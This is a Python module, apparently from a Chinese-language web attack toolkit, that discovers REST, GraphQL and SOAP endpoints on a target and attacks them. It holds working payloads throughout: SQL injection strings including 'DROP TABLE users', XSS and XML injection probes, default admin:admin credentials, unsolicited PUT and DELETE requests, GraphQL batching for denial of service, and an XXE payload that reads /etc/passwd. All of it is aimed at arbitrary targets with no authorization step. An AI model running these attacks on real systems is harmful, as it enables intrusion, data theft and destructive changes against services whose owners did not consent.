# [file name]: attack_modules/api_attacks.py

# !/usr/bin/env python3
"""
🔗 API攻击模块 - 针对REST API, GraphQL, SOAP等的专项攻击
"""

import requests
import re
import json
import time
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)


class APIAttacker:
    """API攻击模块"""

    def __init__(self, config: Dict):
        self.config = config.get('modules', {}).get('api_attacks', {})
        self.timeout = config.get('scan', {}).get('timeout', 15)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*'
        })

    def discover_api_endpoints(self, target: str) -> List[Dict]:
        """发现API端点"""
        endpoints = []

        print("    🔍 扫描API端点...")

        # 常见API路径
        common_api_paths = [
            # REST API
            '/api', '/api/', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/', '/rest/api', '/rest/v1',
            # GraphQL
            '/graphql', '/graphql/', '/gql', '/gql/',
            '/graphql-api', '/graphiql',
            # SOAP
            '/soap', '/soap/', '/wsdl', '/wsdl/',
            # 其他
            '/json', '/json/', '/json/api',
            '/xml', '/xml/', '/xml/api',
            # 文档
            '/swagger', '/swagger-ui', '/swagger-ui.html',
            '/openapi', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/docs', '/docs/api',
            '/redoc', '/rapidoc'
        ]

        for path in common_api_paths:
            api_url = urljoin(target, path)

            try:
                response = self.session.get(api_url, timeout=5, verify=False, allow_redirects=True)

                if response.status_code in [200, 201, 401, 403]:
                    api_type = self.identify_api_type(response)

                    endpoint_info = {
                        'url': response.url,
                        'status': response.status_code,
                        'type': api_type,
                        'content_type': response.headers.get('Content-Type', ''),
                        'content_length': len(response.content)
                    }

                    # 如果是文档页面，提取更多信息
                    if api_type in ['swagger', 'openapi', 'api_docs']:
                        doc_info = self.extract_api_doc_info(response.text)
                        endpoint_info.update(doc_info)

                    endpoints.append(endpoint_info)

                    # 显示发现
                    self.print_api_discovery(endpoint_info)

            except:
                continue

        return endpoints

    def identify_api_type(self, response) -> str:
        """识别API类型"""
        content_type = response.headers.get('Content-Type', '').lower()
        content = response.text.lower()
        url = response.url.lower()

        # GraphQL
        if 'graphql' in url or 'graphiql' in content:
            return 'graphql'

        # Swagger/OpenAPI
        if 'swagger' in content or 'openapi' in content:
            if 'ui' in url or 'html' in content:
                return 'swagger_ui'
            else:
                return 'swagger_json'

        # 文档页面
        if 'api-docs' in url or 'apidocs' in content:
            return 'api_docs'

        if 'redoc' in url or 'rapidoc' in url:
            return 'api_docs'

        # SOAP/WSDL
        if 'wsdl' in content or 'soap' in content or 'soapenv' in content:
            return 'soap'

        # REST API (JSON响应)
        if 'application/json' in content_type:
            return 'rest_json'

        # REST API (XML响应)
        if 'application/xml' in content_type or 'text/xml' in content_type:
            return 'rest_xml'

        return 'unknown_api'

    def extract_api_doc_info(self, content: str) -> Dict:
        """从API文档中提取信息"""
        info = {
            'title': '',
            'version': '',
            'endpoints_found': 0
        }

        # 提取Swagger/OpenAPI信息
        try:
            # 尝试解析JSON
            data = json.loads(content)

            if 'info' in data:
                info['title'] = data['info'].get('title', '')
                info['version'] = data['info'].get('version', '')

            if 'paths' in data:
                info['endpoints_found'] = len(data['paths'])

        except json.JSONDecodeError:
            # 如果是HTML页面，尝试提取信息
            title_match = re.search(r'<title>(.*?)</title>', content, re.I)
            if title_match:
                info['title'] = title_match.group(1)

            # 统计API路径
            path_patterns = [
                r'/api/[^"\']+',
                r'path.*?:.*?"/[^"]+"',
                r'"/[^"]+"\s*:\s*{'
            ]

            for pattern in path_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    info['endpoints_found'] = len(matches)
                    break

        return info

    def print_api_discovery(self, endpoint_info: Dict):
        """打印API发现"""
        status = endpoint_info['status']
        url = endpoint_info['url']
        api_type = endpoint_info['type']

        icons = {
            'rest_json': '📊',
            'rest_xml': '📄',
            'graphql': '🔄',
            'soap': '🧼',
            'swagger_ui': '📋',
            'swagger_json': '📋',
            'api_docs': '📖',
            'unknown_api': '❓'
        }

        icon = icons.get(api_type, '🔗')

        if status == 200:
            status_str = f"✅[{status}]"
        elif status == 401:
            status_str = f"🔒[{status}]"
        elif status == 403:
            status_str = f"🚫[{status}]"
        else:
            status_str = f"[{status}]"

        # 显示额外信息
        extra = ''
        if 'endpoints_found' in endpoint_info and endpoint_info['endpoints_found'] > 0:
            extra = f" ({endpoint_info['endpoints_found']}个端点)"
        elif 'title' in endpoint_info and endpoint_info['title']:
            extra = f" - {endpoint_info['title'][:30]}"

        print(f"    {icon} {status_str} {api_type}: {url}{extra}")

    def attack_rest_api(self, target: str) -> List[Dict]:
        """攻击REST API"""
        results = []

        print("    ⚔️ 开始REST API攻击...")

        # 1. 认证测试
        auth_vulns = self.test_api_authentication(target)
        results.extend(auth_vulns)

        # 2. HTTP方法测试
        method_vulns = self.test_api_methods(target)
        results.extend(method_vulns)

        # 3. 输入验证测试
        input_vulns = self.test_api_input_validation(target)
        results.extend(input_vulns)

        # 4. 速率限制测试
        rate_vulns = self.test_api_rate_limiting(target)
        results.extend(rate_vulns)

        # 5. 信息泄露测试
        info_vulns = self.test_api_info_disclosure(target)
        results.extend(info_vulns)

        return results

    def test_api_authentication(self, target: str) -> List[Dict]:
        """测试API认证"""
        vulns = []

        print("      测试API认证...")

        # 测试未认证访问
        try:
            response = self.session.get(target, timeout=5, verify=False)

            if response.status_code == 200:
                content = response.text.lower()

                # 检查是否返回敏感信息
                sensitive_keywords = [
                    'password', 'secret', 'key', 'token',
                    'database', 'user', 'admin', 'credential'
                ]

                found_keywords = []
                for keyword in sensitive_keywords:
                    if keyword in content:
                        found_keywords.append(keyword)

                if found_keywords:
                    vulns.append({
                        'type': 'api_auth_bypass',
                        'severity': 'high',
                        'description': f'API无需认证即可访问，发现敏感关键词: {", ".join(found_keywords[:3])}',
                        'url': target,
                        'keywords': found_keywords[:5]
                    })

        except:
            pass

        # 测试弱认证方法
        auth_methods = [
            ('Basic', 'Authorization: Basic YWRtaW46YWRtaW4='),  # admin:admin
            ('Bearer', 'Authorization: Bearer test123'),
            ('API-Key', 'X-API-Key: test123'),
            ('Token', 'X-Auth-Token: test123')
        ]

        for auth_name, auth_header in auth_methods:
            try:
                headers = {'Authorization': auth_header.split(': ')[1]}
                response = self.session.get(target, headers=headers, timeout=5, verify=False)

                if response.status_code in [200, 201]:
                    vulns.append({
                        'type': 'api_weak_auth',
                        'severity': 'medium',
                        'description': f'API可能使用弱{auth_name}认证',
                        'url': target,
                        'auth_method': auth_name
                    })
                    break

            except:
                continue

        return vulns

    def test_api_methods(self, target: str) -> List[Dict]:
        """测试API HTTP方法"""
        vulns = []

        print("      测试HTTP方法...")

        # 测试OPTIONS方法
        try:
            response = self.session.options(target, timeout=5, verify=False)

            if 'allow' in response.headers:
                allowed_methods = response.headers['allow']

                dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE']
                found_dangerous = []

                for method in dangerous_methods:
                    if method in allowed_methods:
                        found_dangerous.append(method)

                if found_dangerous:
                    vulns.append({
                        'type': 'api_dangerous_methods',
                        'severity': 'medium',
                        'description': f'API启用了危险HTTP方法: {", ".join(found_dangerous)}',
                        'url': target,
                        'allowed_methods': allowed_methods
                    })

        except:
            pass

        # 测试危险方法
        dangerous_tests = [
            ('PUT', '更新操作', {'data': 'test'}),
            ('DELETE', '删除操作', {}),
            ('PATCH', '部分更新', {'data': 'test'}),
            ('TRACE', '跟踪请求', {})
        ]

        for method, description, data in dangerous_tests:
            try:
                response = self.session.request(method, target, json=data, timeout=5, verify=False)

                if response.status_code not in [405, 403, 401, 501]:
                    vulns.append({
                        'type': 'api_method_allowed',
                        'severity': 'medium',
                        'description': f'{description}方法允许访问: {method}',
                        'url': target,
                        'method': method,
                        'status': response.status_code
                    })

            except:
                continue

        return vulns

    def test_api_input_validation(self, target: str) -> List[Dict]:
        """测试API输入验证"""
        vulns = []

        print("      测试输入验证...")

        # 测试SQL注入
        sql_payloads = [
            "' OR '1'='1",
            "1' AND SLEEP(5)--",
            "1 UNION SELECT NULL--",
            "\" OR \"1\"=\"1"
        ]

        # 测试路径参数
        if '{' in target and '}' in target:
            # 如果URL有路径参数，先跳过
            return vulns

        # 测试查询参数
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)

        test_params = {}
        for param in list(query_params.keys())[:3]:  # 测试前3个参数
            test_params[param] = sql_payloads[0]

        if test_params:
            try:
                response = self.session.get(target, params=test_params, timeout=5, verify=False)

                # 检查SQL错误
                content = response.text.lower()
                sql_errors = ['sql', 'mysql', 'syntax', 'error', 'exception', '警告', '错误']

                if any(error in content for error in sql_errors):
                    vulns.append({
                        'type': 'api_sql_injection',
                        'severity': 'high',
                        'description': 'API可能存在SQL注入漏洞',
                        'url': target,
                        'params': test_params
                    })

            except:
                pass

        # 测试JSON注入
        try:
            json_payload = {
                "test": "' OR '1'='1",
                "data": "<script>alert(1)</script>",
                "id": "1; DROP TABLE users;--"
            }

            response = self.session.post(
                target,
                json=json_payload,
                timeout=5,
                verify=False
            )

            content = response.text
            if "' OR '1'='1" in content or '<script>' in content:
                vulns.append({
                    'type': 'api_input_validation',
                    'severity': 'medium',
                    'description': 'API输入验证不足，特殊字符被反射',
                    'url': target,
                    'method': 'POST'
                })

        except:
            pass

        return vulns

    def test_api_rate_limiting(self, target: str) -> List[Dict]:
        """测试API速率限制"""
        vulns = []

        print("      测试速率限制...")

        # 发送多个请求测试速率限制
        try:
            responses = []
            start_time = time.time()

            for i in range(15):  # 发送15个请求
                try:
                    response = self.session.get(target, timeout=3, verify=False)
                    responses.append(response.status_code)
                except:
                    responses.append('error')

                # 稍微延迟
                time.sleep(0.1)

            elapsed_time = time.time() - start_time

            # 分析响应
            success_count = sum(1 for code in responses if code == 200)

            if success_count == 15:
                vulns.append({
                    'type': 'api_no_rate_limit',
                    'severity': 'low',
                    'description': 'API未实施速率限制',
                    'url': target,
                    'requests_sent': 15,
                    'successful_requests': success_count,
                    'time_elapsed': f'{elapsed_time:.2f}秒'
                })

        except:
            pass

        return vulns

    def test_api_info_disclosure(self, target: str) -> List[Dict]:
        """测试API信息泄露"""
        vulns = []

        print("      测试信息泄露...")

        try:
            response = self.session.get(target, timeout=5, verify=False)
            content = response.text

            # 检查错误信息
            error_indicators = [
                'stack trace', 'exception', 'error at line',
                'at com.', 'at org.', 'at java.',
                'database error', 'sql error', 'warning:',
                'fatal error', 'syntax error', 'undefined'
            ]

            found_errors = []
            for indicator in error_indicators:
                if indicator.lower() in content.lower():
                    found_errors.append(indicator)

            if found_errors:
                vulns.append({
                    'type': 'api_error_disclosure',
                    'severity': 'medium',
                    'description': f'API返回详细错误信息: {", ".join(found_errors[:3])}',
                    'url': target,
                    'errors_found': found_errors[:5]
                })

            # 检查版本信息
            version_patterns = [
                r'version.*?([\d.]+)',
                r'v\d+\.\d+\.\d+',
                r'build.*?([\d.]+)',
                r'release.*?([\d.]+)'
            ]

            found_versions = []
            for pattern in version_patterns:
                matches = re.findall(pattern, content, re.I)
                if matches:
                    found_versions.extend(matches)

            if found_versions:
                vulns.append({
                    'type': 'api_version_disclosure',
                    'severity': 'low',
                    'description': f'API泄露版本信息: {", ".join(set(found_versions)[:3])}',
                    'url': target,
                    'versions_found': list(set(found_versions))[:5]
                })

        except:
            pass

        return vulns

    def attack_graphql(self, target: str) -> List[Dict]:
        """攻击GraphQL API"""
        results = []

        print("    ⚔️ 开始GraphQL攻击...")

        # 1. 内省查询测试
        introspection_vulns = self.test_graphql_introspection(target)
        results.extend(introspection_vulns)

        # 2. 批量查询攻击
        batching_vulns = self.test_graphql_batching(target)
        results.extend(batching_vulns)

        # 3. 查询复杂度攻击
        complexity_vulns = self.test_graphql_complexity(target)
        results.extend(complexity_vulns)

        return results

    def test_graphql_introspection(self, target: str) -> List[Dict]:
        """测试GraphQL内省查询"""
        vulns = []

        print("      测试GraphQL内省...")

        # GraphQL内省查询
        introspection_query = {
            "query": """
            query IntrospectionQuery {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                  ...FullType
                }
                directives {
                  name
                  description
                  locations
                  args {
                    ...InputValue
                  }
                }
              }
            }

            fragment FullType on __Type {
              kind
              name
              description
              fields(includeDeprecated: true) {
                name
                description
                args {
                  ...InputValue
                }
                type {
                  ...TypeRef
                }
                isDeprecated
                deprecationReason
              }
              inputFields {
                ...InputValue
              }
              interfaces {
                ...TypeRef
              }
              enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
              }
              possibleTypes {
                ...TypeRef
              }
            }

            fragment InputValue on __InputValue {
              name
              description
              type { ...TypeRef }
              defaultValue
            }

            fragment TypeRef on __Type {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                        ofType {
                          kind
                          name
                          ofType {
                            kind
                            name
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            """
        }

        try:
            response = self.session.post(
                target,
                json=introspection_query,
                timeout=10,
                verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()

                    if 'data' in data and '__schema' in data['data']:
                        schema = data['data']['__schema']

                        # 统计信息
                        type_count = len(schema.get('types', []))
                        query_type = schema.get('queryType', {}).get('name', '未知')
                        mutation_type = schema.get('mutationType', {}).get('name', '未知')

                        vulns.append({
                            'type': 'graphql_introspection_enabled',
                            'severity': 'medium',
                            'description': f'GraphQL内省查询启用，发现{type_count}个类型',
                            'url': target,
                            'query_type': query_type,
                            'mutation_type': mutation_type,
                            'types_found': type_count
                        })

                except json.JSONDecodeError:
                    pass

        except:
            pass

        return vulns

    def test_graphql_batching(self, target: str) -> List[Dict]:
        """测试GraphQL批量查询"""
        vulns = []

        print("      测试GraphQL批量查询...")

        # 创建批量查询
        batch_queries = []
        for i in range(20):
            batch_queries.append({
                "query": f"query {{ __typename }}"
            })

        try:
            response = self.session.post(
                target,
                json=batch_queries,
                timeout=10,
                verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()

                    if isinstance(data, list):
                        vulns.append({
                            'type': 'graphql_batching_enabled',
                            'severity': 'medium',
                            'description': 'GraphQL支持批量查询，可能用于DoS攻击',
                            'url': target,
                            'batch_size': len(data)
                        })

                except json.JSONDecodeError:
                    pass

        except:
            pass

        return vulns

    def test_graphql_complexity(self, target: str) -> List[Dict]:
        """测试GraphQL查询复杂度"""
        vulns = []

        print("      测试GraphQL查询复杂度...")

        # 创建深度嵌套查询
        nested_query = {
            "query": """
            query DeepQuery {
              a1: __typename
              a2: __typename
              a3: __typename
              a4: __typename
              a5: __typename
              a6: __typename
              a7: __typename
              a8: __typename
              a9: __typename
              a10: __typename
              a11: __typename
              a12: __typename
              a13: __typename
              a14: __typename
              a15: __typename
            }
            """
        }

        try:
            start_time = time.time()
            response = self.session.post(
                target,
                json=nested_query,
                timeout=15,
                verify=False
            )
            elapsed_time = time.time() - start_time

            if response.status_code == 200:
                try:
                    data = response.json()

                    if 'data' in data:
                        # 检查响应时间
                        if elapsed_time > 5:
                            vulns.append({
                                'type': 'graphql_complexity_issue',
                                'severity': 'medium',
                                'description': f'GraphQL复杂查询响应慢 ({elapsed_time:.2f}秒)',
                                'url': target,
                                'response_time': elapsed_time
                            })

                except json.JSONDecodeError:
                    pass

        except:
            pass

        return vulns

    def attack_soap(self, target: str) -> List[Dict]:
        """攻击SOAP API"""
        results = []

        print("    ⚔️ 开始SOAP攻击...")

        # 1. WSDL分析
        wsdl_vulns = self.analyze_wsdl(target)
        results.extend(wsdl_vulns)

        # 2. XML注入测试
        xml_vulns = self.test_soap_xml_injection(target)
        results.extend(xml_vulns)

        # 3. XXE测试
        xxe_vulns = self.test_soap_xxe(target)
        results.extend(xxe_vulns)

        return results

    def analyze_wsdl(self, target: str) -> List[Dict]:
        """分析WSDL文件"""
        vulns = []

        print("      分析WSDL文件...")

        # 获取WSDL文件
        wsdl_url = target
        if not target.endswith('?wsdl'):
            wsdl_url = f"{target}?wsdl"

        try:
            response = self.session.get(wsdl_url, timeout=10, verify=False)

            if response.status_code == 200:
                content = response.text

                if 'wsdl:definitions' in content or '<wsdl:' in content:
                    # 提取服务信息
                    service_match = re.search(r'name="([^"]+)"', content)
                    endpoint_match = re.search(r'location="([^"]+)"', content)

                    service_info = {
                        'wsdl_url': wsdl_url,
                        'service_name': service_match.group(1) if service_match else '未知',
                        'endpoint': endpoint_match.group(1) if endpoint_match else target
                    }

                    vulns.append({
                        'type': 'wsdl_exposed',
                        'severity': 'low',
                        'description': 'WSDL文件暴露',
                        'details': service_info
                    })

        except:
            pass

        return vulns

    def test_soap_xml_injection(self, target: str) -> List[Dict]:
        """测试SOAP XML注入"""
        vulns = []

        print("      测试XML注入...")

        # 简单的SOAP请求模板
        soap_template = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:web="http://example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:TestRequest>
         <web:input>{payload}</web:input>
      </web:TestRequest>
   </soapenv:Body>
</soapenv:Envelope>'''

        xml_payloads = [
            ("test' OR '1'='1", "SQL注入"),
            ("<![CDATA[<script>alert(1)</script>]]>", "XSS注入"),
            ("test]]><test>injection</test><![CDATA[", "XML标签注入")
        ]

        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': ''
        }

        for payload, description in xml_payloads:
            soap_body = soap_template.format(payload=payload)

            try:
                response = self.session.post(
                    target,
                    data=soap_body,
                    headers=headers,
                    timeout=10,
                    verify=False
                )

                if response.status_code == 200:
                    content = response.text

                    # 检查错误或特殊响应
                    if 'error' in content.lower() or 'exception' in content.lower():
                        vulns.append({
                            'type': 'soap_xml_injection',
                            'severity': 'medium',
                            'description': f'SOAP XML注入可能: {description}',
                            'url': target,
                            'payload': payload
                        })
                        break

            except:
                continue

        return vulns

    def test_soap_xxe(self, target: str) -> List[Dict]:
        """测试SOAP XXE漏洞"""
        vulns = []

        print("      测试XXE漏洞...")

        # XXE payload
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:TestRequest>
         <web:input>&xxe;</web:input>
      </web:TestRequest>
   </soapenv:Body>
</soapenv:Envelope>'''

        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': ''
        }

        try:
            response = self.session.post(
                target,
                data=xxe_payload,
                headers=headers,
                timeout=10,
                verify=False
            )

            if response.status_code == 200:
                content = response.text

                if 'root:' in content:
                    vulns.append({
                        'type': 'soap_xxe_vulnerable',
                        'severity': 'high',
                        'description': 'SOAP API存在XXE漏洞',
                        'url': target,
                        'evidence': '成功读取/etc/passwd文件'
                    })

        except:
            pass

        return vulns

    def execute_attack(self, target: str, api_type: str = None) -> List[Dict]:
        """执行API攻击"""
        results = []

        # 先发现API端点
        endpoints = self.discover_api_endpoints(target)

        if not endpoints:
            print("    ⚠️  未发现API端点")
            return results

        # 对每个端点执行攻击
        for endpoint in endpoints:
            endpoint_type = endpoint['type']
            endpoint_url = endpoint['url']

            print(f"    🎯 攻击 {endpoint_type}: {endpoint_url}")

            if endpoint_type in ['rest_json', 'rest_xml', 'unknown_api']:
                rest_results = self.attack_rest_api(endpoint_url)
                results.extend(rest_results)

            elif endpoint_type == 'graphql':
                graphql_results = self.attack_graphql(endpoint_url)
                results.extend(graphql_results)

            elif endpoint_type == 'soap':
                soap_results = self.attack_soap(endpoint_url)
                results.extend(soap_results)

            elif endpoint_type in ['swagger_ui', 'swagger_json', 'api_docs']:
                results.append({
                    'type': 'api_docs_found',
                    'severity': 'info',
                    'description': f'API文档暴露: {endpoint_url}',
                    'url': endpoint_url,
                    'details': endpoint
                })

        return results


# 测试函数
def test_api_attacker():
    """测试API攻击模块"""
    print("=" * 60)
    print("🧪 API攻击模块测试")
    print("=" * 60)

    config = {
        'modules': {
            'api_attacks': {
                'rest_api': {'enabled': True},
                'graphql': {'enabled': True},
                'soap': {'enabled': True}
            }
        },
        'scan': {'timeout': 10}
    }

    attacker = APIAttacker(config)

    # 测试API端点发现
    test_url = "http://example.com"
    endpoints = attacker.discover_api_endpoints(test_url)

    print(f"发现 {len(endpoints)} 个API端点")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_api_attacker()
